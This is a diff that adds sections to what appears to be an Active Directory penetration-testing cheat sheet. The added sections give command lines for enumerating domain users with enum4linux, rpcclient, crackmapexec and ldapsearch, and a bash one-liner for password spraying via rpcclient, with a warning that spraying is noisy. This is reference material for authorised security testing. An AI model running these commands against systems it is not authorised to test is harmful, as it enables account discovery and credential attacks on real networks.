@@ -32,6 +32,41 @@ Finding something from nothing
   Get NTLMV@UNIQUE # View Hashes
   Get NTLMV2USERNAMES # View Usernames
   ```
+
+Making a list, checking it twice
+
+* enum4linux
+  ```bash
+  enum4linux -U <IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+  ```
+* rpcclient
+  ```bash
+  # Will require manually fixing the list
+  rpcclient -U "" -N <IP>
+  enumdomusers
+  ```
+* crackmapexec
+  ```bash
+  # Will require manually fixing the list
+  crackmapexec smb <IP> --users
+  ```
+* ldapsearch
+  ```bash
+  ldapsearch -h <IP> -x -b "DC=test,DC=local" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+  ```
+* crackmapexe w/ Credentials
+  ```bash
+  sudo crackmapexec smb <IP> -u <username> -p <password> --users
+  ```
+
+Spray and Pray
+> Password spraying is very loud and very likley to be detected by a blue team
+* Bash one-liner
+  ```bash
+  for u in $(cat <userlist>);do rpcclient -U "<password-to-test" -c "getusername;quit" <IP> | grep Authority; done
+  ```
+
+
 ## User Hunting
 
 Sometimes you need to find a machine where a specific user is logged in.
